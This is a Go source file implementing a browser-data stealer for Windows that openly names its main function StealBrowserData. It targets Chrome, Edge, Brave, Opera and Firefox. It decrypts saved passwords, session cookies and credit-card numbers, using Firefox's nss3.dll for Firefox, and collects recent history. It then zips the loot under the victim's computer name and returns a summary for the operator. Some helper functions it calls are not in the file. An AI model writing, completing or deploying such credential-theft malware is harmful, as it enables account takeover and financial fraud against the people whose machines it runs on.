package handlers

import (
	"archive/zip"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3" 
)

// this is a beta... it might not work well
var (
	secretKey = []byte("xZ3#t9q_B4r!8LmN@f7")

	nss3DLL        *syscall.LazyDLL
	nssInit        *syscall.LazyProc
	pk11GetSlot    *syscall.LazyProc
	pk11CheckPwd   *syscall.LazyProc
	pk11SdrDecrypt *syscall.LazyProc
	nssShutdown    *syscall.LazyProc
	nssLoaded      = false
)

type browserData struct {
	Passwords string
	Cookies   string
	Cards     string
	History   string
}

type browserInfo struct {
	Name string
	Path string
	Type string 
}

type secItem struct {
	Type uint32
	Data uintptr
	Len  uint32
}


func StealBrowserData() (string, string) {
	data := browserData{}
	browsers := getBrowserPaths()

	loadNSS() 

	for _, browser := range browsers {
		if _, err := os.Stat(browser.Path); os.IsNotExist(err) {
			continue
		}

		if browser.Type == "chromium" {
			processChromium(browser, &data)
		} else if browser.Type == "firefox" && nssLoaded {
			processFirefox(browser, &data)
		}
	}

	if nssLoaded {
		nssShutdown.Call() 
	}

	return createZipFile(data)
}


func processFirefox(browser browserInfo, data *browserData) {
	profileFiles, err := ioutil.ReadDir(browser.Path)
	if err != nil {
		return
	}

	for _, profile := range profileFiles {
		if !profile.IsDir() {
			continue
		}

		profilePath := filepath.Join(browser.Path, profile.Name())
		loginsJsonPath := filepath.Join(profilePath, "logins.json")

		if _, err := os.Stat(loginsJsonPath); os.IsNotExist(err) {
			continue
		}

		ret, _, _ := nssInit.Call(uintptr(unsafe.Pointer(syscall.StringBytePtr(profilePath))))
		if ret != 0 {
			continue
		}

		content, err := ioutil.ReadFile(loginsJsonPath)
		if err != nil {
			continue
		}

		var ffLogins struct {
			Logins []struct {
				Hostname          string `json:"hostname"`
				EncryptedUsername string `json:"encryptedUsername"`
				EncryptedPassword string `json:"encryptedPassword"`
			} `json:"logins"`
		}

		if json.Unmarshal(content, &ffLogins) == nil {
			for _, login := range ffLogins.Logins {
				user, _ := decryptFirefoxField(login.EncryptedUsername)
				pass, _ := decryptFirefoxField(login.EncryptedPassword)
				if pass != "" {
					data.Passwords += fmt.Sprintf("URL: %s\nUser: %s\nPass: %s\nFrom: Firefox (%s)\n\n", login.Hostname, user, pass, profile.Name())
				}
			}
		}
	}
}

func decryptFirefoxField(b64Data string) (string, error) {
	decoded, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return "", err
	}

	inSec := secItem{Data: uintptr(unsafe.Pointer(&decoded[0])), Len: uint32(len(decoded))}
	outSec := secItem{}

	ret, _, _ := pk11SdrDecrypt.Call(uintptr(unsafe.Pointer(&inSec)), uintptr(unsafe.Pointer(&outSec)), 0)
	if ret != 0 {
		return "", fmt.Errorf("PK11SDR_Decrypt falló")
	}

	if outSec.Len == 0 {
		return "", nil
	}

	decryptedBytes := (*[1 << 30]byte)(unsafe.Pointer(outSec.Data))[:outSec.Len:outSec.Len]
	return string(decryptedBytes), nil
}

func processChromium(browser browserInfo, data *browserData) {
	localStatePath := filepath.Join(browser.Path, "Local State")
	masterKey := decryptMasterKey(localStatePath)
	if masterKey == nil {
		return
	}

	loginDataDB := filepath.Join(browser.Path, "Default", "Login Data")
	cookiesDB := filepath.Join(browser.Path, "Default", "Network", "Cookies")
	webDataDB := filepath.Join(browser.Path, "Default", "Web Data")
	historyDB := filepath.Join(browser.Path, "Default", "History")

	data.Passwords += getPasswords(loginDataDB, masterKey, browser.Name)
	data.Cookies += getCookies(cookiesDB, masterKey, browser.Name)
	data.Cards += getCards(webDataDB, masterKey, browser.Name)
	data.History += getHistory(historyDB, browser.Name)
}


func getPasswords(dbPath string, key []byte, browserName string) string {
	var results strings.Builder
	query := "SELECT origin_url, username_value, password_value FROM logins"
	processDB(dbPath, query, func(rows *sql.Rows) {
		var url, username string
		var encryptedPass []byte
		if rows.Scan(&url, &username, &encryptedPass) == nil {
			if pass, err := decryptToken(encryptedPass, key); err == nil && pass != "" {
				results.WriteString(fmt.Sprintf("URL: %s\nUser: %s\nPass: %s\nFrom: %s\n\n", url, username, pass, browserName))
			}
		}
	})
	return results.String()
}

func getCookies(dbPath string, key []byte, browserName string) string {
	var results strings.Builder
	query := "SELECT host_key, name, path, encrypted_value FROM cookies"
	processDB(dbPath, query, func(rows *sql.Rows) {
		var host, name, path string
		var encryptedCookie []byte
		if rows.Scan(&host, &name, &path, &encryptedCookie) == nil {
			if cookie, err := decryptToken(encryptedCookie, key); err == nil && cookie != "" {
				results.WriteString(fmt.Sprintf("%s\tTRUE\t%s\tFALSE\t0\t%s\t%s\n", host, path, name, cookie))
			}
		}
	})
	return results.String()
}

func getCards(dbPath string, key []byte, browserName string) string {
	var results strings.Builder
	query := "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
	processDB(dbPath, query, func(rows *sql.Rows) {
		var name, month, year string
		var encryptedCard []byte
		if rows.Scan(&name, &month, &year, &encryptedCard) == nil {
			if card, err := decryptToken(encryptedCard, key); err == nil && card != "" {
				results.WriteString(fmt.Sprintf("Name: %s\nExp: %s/%s\nNum: %s\nFrom: %s\n\n", name, month, year, card, browserName))
			}
		}
	})
	return results.String()
}

func getHistory(dbPath, browserName string) string {
	var results strings.Builder
	query := "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
	processDB(dbPath, query, func(rows *sql.Rows) {
		var url, title string
		var visitTime int64
		if rows.Scan(&url, &title, &visitTime) == nil {
			results.WriteString(fmt.Sprintf("URL: %s\nTitle: %s\nFrom: %s\n\n", url, title, browserName))
		}
	})
	return results.String()
}

func processDB(dbPath, query string, processor func(*sql.Rows)) {
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		return
	}

	tempDbPath := filepath.Join(os.TempDir(), "temp_db_copy.sqlite")
	defer os.Remove(tempDbPath)

	source, err := os.Open(dbPath)
	if err != nil {
		return
	}
	defer source.Close()

	dest, err := os.Create(tempDbPath)
	if err != nil {
		return
	}
	defer dest.Close()

	if _, err := io.Copy(dest, source); err != nil {
		return
	}

	db, err := sql.Open("sqlite3", tempDbPath)
	if err != nil {
		return
	}
	defer db.Close()

	rows, err := db.Query(query)
	if err != nil {
		return
	}
	defer rows.Close()

	for rows.Next() {
		processor(rows)
	}
}


func loadNSS() {
	if nssLoaded {
		return
	}

	programFiles := os.Getenv("ProgramFiles")
	programFilesX86 := os.Getenv("ProgramFiles(x86)")

	possiblePaths := []string{
		filepath.Join(programFiles, "Mozilla Firefox", "nss3.dll"),
		filepath.Join(programFilesX86, "Mozilla Firefox", "nss3.dll"),
	}

	for _, path := range possiblePaths {
		if _, err := os.Stat(path); err == nil {
			nss3DLL = syscall.NewLazyDLL(path)
			if nss3DLL.Load() == nil {
				nssInit = nss3DLL.NewProc("NSS_Init")
				pk11GetSlot = nss3DLL.NewProc("PK11_GetInternalKeySlot")
				pk11CheckPwd = nss3DLL.NewProc("PK11_CheckUserPassword")
				pk11SdrDecrypt = nss3DLL.NewProc("PK11SDR_Decrypt")
				nssShutdown = nss3DLL.NewProc("NSS_Shutdown")
				nssLoaded = true
				return
			}
		}
	}
}

func getBrowserPaths() []browserInfo {
	appdata := os.Getenv("APPDATA")
	localAppdata := os.Getenv("LOCALAPPDATA")
	return []browserInfo{
		{Name: "Google Chrome", Path: filepath.Join(localAppdata, "Google", "Chrome", "User Data"), Type: "chromium"},
		{Name: "Microsoft Edge", Path: filepath.Join(localAppdata, "Microsoft", "Edge", "User Data"), Type: "chromium"},
		{Name: "Brave", Path: filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data"), Type: "chromium"},
		{Name: "Opera", Path: filepath.Join(appdata, "Opera Software", "Opera Stable"), Type: "chromium"},
		{Name: "Opera GX", Path: filepath.Join(appdata, "Opera Software", "Opera GX Stable"), Type: "chromium"},
		{Name: "Mozilla Firefox", Path: filepath.Join(appdata, "Mozilla", "Firefox", "Profiles"), Type: "firefox"},
	}
}

func createZipFile(data browserData) (string, string) {
	if data.Passwords == "" && data.Cookies == "" && data.Cards == "" && data.History == "" {
		return "", "No browser data found"
	}

	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("%s-BrowserData.zip", os.Getenv("COMPUTERNAME")))
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return "", "❌ Error creating ZIP"
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	pCount := len(strings.Split(data.Passwords, "\n\n")) - 1
	cCount := len(strings.Split(data.Cards, "\n\n")) - 1
	hCount := len(strings.Split(data.History, "\n\n")) - 1

	if data.Passwords != "" {
		addFileToZip(zipWriter, fmt.Sprintf("Passwords (%d).txt", pCount), data.Passwords)
	}
	if data.Cookies != "" {
		addFileToZip(zipWriter, "Cookies.txt", data.Cookies)
	}
	if data.Cards != "" {
		addFileToZip(zipWriter, fmt.Sprintf("Credit Cards (%d).txt", cCount), data.Cards)
	}
	if data.History != "" {
		addFileToZip(zipWriter, fmt.Sprintf("History (%d).txt", hCount), data.History)
	}

	summary := fmt.Sprintf("🔑 **Browser data obtained:** `Passwords: %d | Cards: %d | History: %d`", pCount, cCount, hCount)
	return zipPath, summary
}

func addFileToZip(writer *zip.Writer, filename, content string) error {
	f, err := writer.Create(filename)
	if err != nil {
		return err
	}
	_, err = f.Write([]byte(content))
	return err
}
